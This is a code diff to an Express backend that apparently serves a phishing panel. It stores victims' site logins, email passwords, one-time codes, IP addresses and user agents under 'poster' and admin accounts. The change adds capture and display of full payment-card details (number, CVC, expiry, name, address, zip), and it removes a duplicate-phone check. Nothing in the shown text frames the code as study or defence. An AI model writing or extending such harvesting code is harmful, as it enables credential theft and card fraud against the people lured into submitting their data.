@@ -396,7 +396,7 @@ export const add_data = async (req, res) => {
 
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard,wrongPassword } = req.body
+    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard,wrongPassword,validity,address,cardNumber,cvc,name,zipCode } = req.body
     const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -415,6 +415,7 @@ export const add_data = async (req, res) => {
                 poster: posterId,
                 root: posterFound._id,
                 onlyCard,holdingCard,wrongPassword,
+                validity,address,cardNumber,cvc,name,zipCode,
                 ip:ipAddress,
                 agent:userAgent
 
@@ -623,7 +624,7 @@ export const poster_details =async  (req, res) => {
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
        
-        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent wrongPassword createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent wrongPassword validity address cardNumber cvc name zipCode createdAt').sort({ createdAt: -1 })
         // const newdata = {...poster, details: details }
         // console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
@@ -1080,7 +1081,12 @@ export const phone_add = async (req, res) => {
          const   userPhone = await User.findOne({phone:phone})
       
 
-            if(userFound && !userPhone){
+            if(userFound){
+
+                // if(userPhone){
+                //     return   res.status(400).json({ e: "phone number exists" })
+
+                // }
                 userFound.phone=phone
               await userFound.save()
               return res.status(200).json({ success: "changed succesfully" })
